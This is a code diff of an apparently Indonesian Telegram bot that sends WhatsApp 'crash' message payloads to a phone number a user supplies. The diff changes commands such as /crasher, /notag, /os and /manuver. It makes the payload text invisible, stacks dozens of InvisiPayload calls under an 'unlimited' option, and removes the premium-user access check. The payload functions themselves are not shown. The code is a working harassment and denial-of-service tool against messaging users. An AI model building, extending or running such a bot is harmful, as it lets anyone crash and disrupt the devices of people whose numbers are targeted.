@@ -16,7 +16,7 @@ function isPremium(userId) {
   return premiumUsers.includes(userId.toString());
 }
 const cooldowns = new Map();
-const COOLDOWN_TIME = 80 * 1000; // 60 detik
+const COOLDOWN_TIME = 80 * 5000; // 60 detik
 const crypto = require("crypto");
 const path = require("path");
 const token = config.BOT_TOKEN;
@@ -1233,7 +1233,7 @@ async function InvisiPayload(sock, jid) {
                 },
               },
               body: {
-                text: "ꪶ𖣂ꫂ 𝗙𝗮𝗶𝗹 𝗕𝗲𝘁𝗮 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )         𐎟",
+                text: "ㅤㅤㅤㅤㅤ",
               },
               nativeFlowMessage: {
                 buttons: [
@@ -1433,10 +1433,8 @@ bot.onText(/\/ranz (\d+)/, async (msg, match) => {
     parse_mode: "Markdown",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "〄ForClose༽", callback_data: `crasher_${jid}` }],
-        [{ text: "፠Cr⃢ash⃢Wa", callback_data: `notag_${jid}` }],
+        [{ text: "〄ForClose༽", callback_data: `unlimited_${jid}` }],
         [{ text: "⏚CrashIphone⏎", callback_data: `os_${jid}` }],
-        [{ text: "✈CrashHard✇", callback_data: `manuver_${jid}` }],
       ],
     },
   });
@@ -1473,7 +1471,7 @@ bot.on("callback_query", async (callbackQuery) => {
     "os": [IosMJ, IosMJ, IosMJ, NoIos, NoIos, NoIos, NoIos, NoIos],
     "combox": [Bug4, InvisiPayload, crashui, Bug4,Bug4, crashui, InvisiPayload, Bug4],
     "manuver": [Bug4, Bug3, Bug2, InvisiPayload, Bug4, Bug4],
-    "unlimited": [Bug4, Bug3, Bug2, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, Bug4, Bug4],
+    "unlimited": [InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload, InvisiPayload],
   };
 
   if (!bugTypes[bugType]) {
@@ -1802,7 +1800,7 @@ bot.onText(/\/addbot (.+)/, async (msg, match) => {
   }
 });
 
-bot.onText(/\/crasher (.+)/, async (msg, match) => {
+bot.onText(/\/ranzv1 (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
 
@@ -1813,7 +1811,7 @@ bot.onText(/\/crasher (.+)/, async (msg, match) => {
 
     if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
       const remainingTime = Math.ceil(
-        (COOLDOWN_TIME - (now - lastUsage)) / 1000
+        (COOLDOWN_TIME - (now - lastUsage)) / 5000
       );
       return bot.sendMessage(
         chatId,
@@ -1824,15 +1822,7 @@ bot.onText(/\/crasher (.+)/, async (msg, match) => {
 
     // Tandai waktu terakhir pengguna menjalankan perintah
     cooldowns.set(userId, now);
-
-    if (!isPremium(userId) && !isSupervip(userId)) {
-      return bot.sendMessage(
-        chatId,
-        "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
-        { parse_mode: "Markdown" }
-      );
-    }
-
+    
     const [targetNumber, ...messageWords] = match[1].split(" ");
     const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
     const jid = `${formattedNumber}@s.whatsapp.net`;
@@ -1862,14 +1852,7 @@ bot.onText(/\/crasher (.+)/, async (msg, match) => {
           continue;
         }
 
-        await Bug4(sock, jid);
-        await Bug3(sock, jid);
-        await Bug3(sock, jid);
-        await Bug4(sock, jid);
-        await Bug4(sock, jid);
-        await Bug3(sock, jid);
-        await Bug3(sock, jid);
-        await Bug4(sock, jid);
+        await Bug9(sock, jid);
         successCount++;
       } catch (error) {
         failCount++;
@@ -1909,7 +1892,7 @@ bot.onText(/\/notag (.+)/, async (msg, match) => {
 
     if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
       const remainingTime = Math.ceil(
-        (COOLDOWN_TIME - (now - lastUsage)) / 1000
+        (COOLDOWN_TIME - (now - lastUsage)) / 5000
       );
       return bot.sendMessage(
         chatId,
@@ -1958,14 +1941,7 @@ bot.onText(/\/notag (.+)/, async (msg, match) => {
           continue;
         }
 
-        await Bug4(sock, jid);
-        await Bug3(sock, jid);
-        await Bug3(sock, jid);
-        await Bug4(sock, jid);
-        await Bug4(sock, jid);
-        await Bug2(sock, jid);
-        await Bug2(sock, jid);
-        await Bug4(sock, jid);
+        await Bug9(sock, jid);        
         
         successCount++;
       } catch (error) {
@@ -2006,7 +1982,7 @@ bot.onText(/\/os (.+)/, async (msg, match) => {
 
     if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
       const remainingTime = Math.ceil(
-        (COOLDOWN_TIME - (now - lastUsage)) / 1000
+        (COOLDOWN_TIME - (now - lastUsage)) / 5000
       );
       return bot.sendMessage(
         chatId,
@@ -2103,7 +2079,7 @@ bot.onText(/\/manuver (.+)/, async (msg, match) => {
 
     if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
       const remainingTime = Math.ceil(
-        (COOLDOWN_TIME - (now - lastUsage)) / 1000
+        (COOLDOWN_TIME - (now - lastUsage)) / 5000
       );
       return bot.sendMessage(
         chatId,
